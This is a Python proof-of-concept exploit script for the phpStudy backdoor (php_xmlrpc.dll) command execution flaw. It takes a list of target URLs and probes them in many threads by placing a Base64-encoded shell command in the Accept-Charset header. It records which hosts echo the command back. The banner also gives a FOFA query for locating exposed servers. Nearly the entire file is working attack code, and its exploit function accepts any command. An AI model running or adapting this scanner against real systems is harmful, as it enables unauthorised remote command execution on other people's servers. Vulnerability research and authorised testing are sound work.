#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/5/12
# @Github  : https://github.com/Cr4y0nXX

import os
import time
import base64
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.init()
        self.urlList = self.loadURL()  # 所有目标
        self.multiRun()
        self.start = time.time()

    def banner(self):
        logo = r"""
           _           _____ _             _      ______  _____  _____ 
          | |         /  ___| |           | |     | ___ \/  __ \|  ___|
     _ __ | |__  _ __ \ `--.| |_ _   _  __| |_   _| |_/ /| /  \/| |__  
    | '_ \| '_ \| '_ \ `--. \ __| | | |/ _` | | | |    / | |    |  __| 
    | |_) | | | | |_) /\__/ / |_| |_| | (_| | |_| | |\ \ | \__/\| |___ 
    | .__/|_| |_| .__/\____/ \__|\__,_|\__,_|\__, \_| \_| \____/\____/   POC
    | |         | |                           __/ |                    
    |_|         |_|                          |___/            Author: Cr4y0n
        """
        msg = """
==================================================
| 漏洞名称 | phpStudy任意命令执行漏洞（后门事件）
| 漏洞时间 | 2018-12-？
| 影响版本 | phpstudy 2016版PHP5.4，phpstudy2018版php-5.2.17和php-5.4.45
| 漏洞文件 | php_xmlrpc.dll
| 默认路径 | */php/php-*/ext/php_xmlrpc.dll
| FOFA语句 | app="phpstudy探针"
==================================================
        """
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def init(self):
        print("\nthread:", self.args.thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-f", "--file", required=False, type=str, default=f"./url.txt", help=f"The url file, default is ./url.txt")
        parser.add_argument("-t", "--thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help=f"Vuln url output file, default is {date}.txt")
        return parser.parse_args()

    # 验证漏洞
    def verify(self, url):
        cmd = "echo 'ctx1ytxamszdj';"
        repData = self.exploitVuln(url, cmd)
        if "ctx1ytxamszdj" in repData:
            msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
            self.lock.acquire()
            try:
                self.findCount += 1
                self.vulnRULList.append(url)
            finally:
                self.lock.release()
        elif "Conn" == repData:
            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
        else:
            msg = f"[-] [ Safe ]  {url}"
        self.lock.acquire()
        try:
            print(msg)
        finally:
            self.lock.release()

    # 利用漏洞 执行命令
    def exploitVuln(self, url, cmd):
        reqURL = url
        cmdBase64 = base64.b64encode(cmd.encode()).decode()
        headers = {
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "accept-charset": cmdBase64,
            "Accept-Encoding": "gzip,deflate",
            "Connection": "close",
        }
        try:
            rep = requests.get(url=reqURL, headers=headers, timeout=self.args.timeout, verify=False)
            cmdData = rep.text.strip()
            return cmdData
        except:
            return "Conn"

    # 加载url地址(带http://)
    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for line in f.readlines():
                line = line.strip()
                if "https://" in line:
                    line = line.replace("https://", "http://")
                if "http://" not in line:
                    line = f"http://{line}"
                urlList.append(line)
        return urlList

    # 多线程运行
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        executor.map(self.verify, self.urlList)

    # 输出到文件
    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.args.output}.txt"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")

    def __del__(self):
        try:
            print("\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    POC()
    # cmd = 'echo "ctx1ytxamszdj";'
    # cmdBase64 = base64.b64encode(cmd.encode()).decode()
    # print(cmdBase64)

